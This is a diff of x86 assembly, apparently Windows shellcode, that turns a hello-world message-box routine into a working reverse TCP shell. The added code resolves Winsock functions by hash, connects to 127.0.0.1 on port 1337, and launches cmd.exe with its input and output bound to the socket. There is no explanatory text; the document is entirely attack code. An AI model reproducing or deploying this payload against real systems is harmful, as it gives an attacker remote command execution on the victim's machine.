@@ -1,6 +1,6 @@
 start:
        mov ebp, esp
-       sub esp, 0x624
+       sub esp, 0x628
    find_kernel32:                       
        xor ecx,ecx                     
        mov esi,fs:[ecx+30h]            
@@ -68,169 +68,152 @@ start:
        push 0xec0e4e8e
        call dword ptr [ebp+0x04]       
        mov [ebp+0x14], eax             
-       push 0x0006c
-       push 0x6c642e6c
-       push 0x6c64746e
-       push esp
-       call dword ptr [ebp+0x14]
-       mov ebx, eax
-       push 0x77c93c6
+       push 0x16b3fe72
        call dword ptr [ebp+0x04]
        mov [ebp+0x20], eax
-       push 0x3e192526
-       call dword ptr [ebp+0x04]
-       mov [ebp+0x24], eax
        push 0x006c6c
        push 0x642e3233
-       push 0x72657375
+       push 0x5f327377
        push esp
        call dword ptr [ebp+0x14]
        mov ebx, eax
-       push 0xbc4da2a8
+       push 0x3bfcedcb
+       call dword ptr [ebp+0x04]
+       mov [ebp+0x24], eax
+       push 0xadf509d9
        call dword ptr [ebp+0x04]
        mov [ebp+0x28], eax
+       push 0xb32dba0c
+       call dword ptr [ebp+0x04]
+       mov [ebp+0x2c], eax
        mov esi, ebp
        jmp main
-   strlen:
+   ConnectTcp:
        push ebp
        mov ebp, esp
-       sub esp, 0x8
-       mov dword ptr [ebp-0x4], 0x0
+       sub esp, 0x18
+       sub esp, 0x190
+       mov [ebp-0x4], esp
+       mov dword ptr [ebp-0x8], 0x202
        mov eax, [ebp+0x8]
-       mov ebx, [ebp-0x4]
-       add eax, ebx
-       mov al, byte ptr[eax]
-       movzx eax, al
-       mov dword ptr [ebp-0x8], eax
-   while_stmt1:
+       push 0x0
+       push 0x0
+       push eax
+       push 0x0
+       mov [ebp-0xc], esp
+       mov eax, [ebp+0xc]
+       rol ax, 8
+       mov dword ptr [ebp+0xc], eax
+       mov eax, [ebp+0xc]
+       shl eax, 16
+       mov dword ptr [ebp+0xc], eax
+       mov eax, [ebp+0xc]
+       add eax, 2
+       mov dword ptr [ebp-0x10], eax
+       mov eax, [ebp-0xc]
+       mov ebx, [ebp-0x10]
+       mov dword ptr [eax], ebx
        mov eax, [ebp-0x8]
-       cmp eax, 0x0
-       jle while_stmt1_end
-       mov eax, [ebp-0x4]
-       add eax, 1
-       mov dword ptr [ebp-0x4], eax
-       mov eax, [ebp+0x8]
        mov ebx, [ebp-0x4]
-       add eax, ebx
-       mov al, byte ptr[eax]
-       movzx eax, al
-       mov dword ptr [ebp-0x8], eax
-       jmp while_stmt1
-   while_stmt1_end:
-       mov eax, [ebp-0x4]
+       push ebx
+       push eax
+       call dword ptr [esi+0x24]
+       push 0x0
+       push 0x0
+       push 0x0
+       push 0x6
+       push 0x1
+       push 0x2
+       call dword ptr [esi+0x28]
+       mov dword ptr [ebp-0x14], eax
+       mov eax, [ebp-0x14]
+       mov ebx, [ebp-0xc]
+       push 0x0
+       push 0x0
+       push 0x0
+       push 0x0
+       push 0x10
+       push ebx
+       push eax
+       call dword ptr [esi+0x2c]
+       mov dword ptr [ebp-0x18], eax
+       mov eax, [ebp-0x14]
        mov esp, ebp
        pop ebp
        ret
-   strcat:
+   ReverseTcpShell:
        push ebp
        mov ebp, esp
-       sub esp, 0x1c
+       sub esp, 0x14
+       push 0x0657865
+       push 0x2e646d63
+       mov [ebp-0x4], esp
        mov eax, [ebp+0x8]
-       push eax
-       call strlen
-       mov dword ptr [ebp-0x4], eax
-       mov eax, [ebp+0xc]
-       push eax
-       call strlen
-       mov dword ptr [ebp-0x8], eax
-       mov eax, [ebp-0x4]
-       mov ebx, [ebp-0x8]
-       add eax, ebx
-       mov dword ptr [ebp-0xc], eax
-       mov eax, [ebp-0xc]
-       add eax, 1
-       mov dword ptr [ebp-0xc], eax
-       push 0x0
-       push 0x0
-       push 0x0
-       push 0x0
-       push 0x0
-       push 0x2
-       call dword ptr [esi+0x20]
-       mov dword ptr [ebp-0x10], eax
-       mov eax, [ebp-0x10]
-       mov ebx, [ebp-0xc]
+       mov ebx, [ebp+0xc]
        push ebx
-       push 0x8
        push eax
-       call dword ptr [esi+0x24]
-       mov dword ptr [ebp-0x14], eax
-       mov dword ptr [ebp-0x18], 0x0
-   while_stmt3:
-       mov eax, [ebp-0x18]
-       mov ebx, [ebp-0x4]
-       cmp eax, ebx
-       jg while_stmt3_end
-       mov eax, [ebp-0x14]
-       mov ebx, [ebp-0x18]
+       call ConnectTcp
+       mov dword ptr [ebp-0x8], eax
+       sub esp, 0x44
+       mov [ebp-0xc], esp
+       mov dword ptr [ebp-0x10], 0x0
+   while_stmt1:
+       mov eax, [ebp-0x10]
+       cmp eax, 0x11
+       jge while_stmt1_end
+       mov eax, [ebp-0xc]
+       mov ebx, [ebp-0x10]
+       sal ebx, 2
        add eax, ebx
-       mov ecx, [ebp+0x8]
-       mov edx, [ebp-0x18]
-       add ecx, edx
-       mov cl, byte ptr[ecx]
-       movzx ecx, cl
-       mov byte ptr [eax], cl
-       mov eax, [ebp-0x18]
+       mov dword ptr [eax], 0x0
+       mov eax, [ebp-0x10]
        add eax, 1
-       mov dword ptr [ebp-0x18], eax
-       jmp while_stmt3
-   while_stmt3_end:
-       mov dword ptr [ebp-0x18], 0x0
-   while_stmt4:
-       mov eax, [ebp-0x18]
+       mov dword ptr [ebp-0x10], eax
+       jmp while_stmt1
+   while_stmt1_end:
+       mov eax, [ebp-0xc]
+       add eax, 0x2c
+       mov dword ptr [eax], 0x100
+       mov eax, [ebp-0xc]
+       add eax, 0x38
        mov ebx, [ebp-0x8]
-       cmp eax, ebx
-       jg while_stmt4_end
-       mov eax, [ebp-0x18]
-       mov ebx, [ebp-0x4]
-       add eax, ebx
-       mov dword ptr [ebp-0x1c], eax
-       mov eax, [ebp-0x14]
-       mov ebx, [ebp-0x1c]
-       add eax, ebx
-       mov ecx, [ebp+0xc]
-       mov edx, [ebp-0x18]
-       add ecx, edx
-       mov cl, byte ptr[ecx]
-       movzx ecx, cl
-       mov byte ptr [eax], cl
-       mov eax, [ebp-0x18]
-       add eax, 1
-       mov dword ptr [ebp-0x18], eax
-       jmp while_stmt4
-   while_stmt4_end:
-       mov eax, [ebp-0x14]
+       mov dword ptr [eax], ebx
+       mov eax, [ebp-0xc]
+       add eax, 0x3c
+       mov ebx, [ebp-0x8]
+       mov dword ptr [eax], ebx
+       mov eax, [ebp-0xc]
+       add eax, 0x40
+       mov ebx, [ebp-0x8]
+       mov dword ptr [eax], ebx
+       sub esp, 0x10
+       mov [ebp-0x14], esp
+       mov eax, [ebp-0xc]
+       mov dword ptr [eax], 0x44
+       mov eax, [ebp-0x4]
        mov ebx, [ebp-0xc]
-       add eax, ebx
-       mov byte ptr [eax], 0x0
-       mov eax, [ebp-0x14]
+       mov ecx, [ebp-0x14]
+       push ecx
+       push ebx
+       push 0x0
+       push 0x0
+       push 0x0
+       push 0x1
+       push 0x0
+       push 0x0
+       push eax
+       push 0x0
+       call dword ptr [esi+0x20]
+       mov eax, 1
        mov esp, ebp
        pop ebp
        ret
    main:
        push ebp
        mov ebp, esp
-       sub esp, 0xc
-       push 0x00206f
-       push 0x6c6c6548
-       mov [ebp-0x4], esp
-       push 0x002164
-       push 0x6c726f77
-       mov [ebp-0x8], esp
-       push 0x06e6f69
-       push 0x74706143
-       mov [ebp-0xc], esp
-       mov eax, [ebp-0x4]
-       mov ebx, [ebp-0x8]
-       push ebx
-       push eax
-       call strcat
-       mov ecx, [ebp-0xc]
-       push 0x0
-       push ecx
-       push eax
-       push 0x0
-       call dword ptr [esi+0x28]
+       push 0x539
+       push 0x100007f
+       call ReverseTcpShell
        mov eax, 1
        mov esp, ebp
        pop ebp
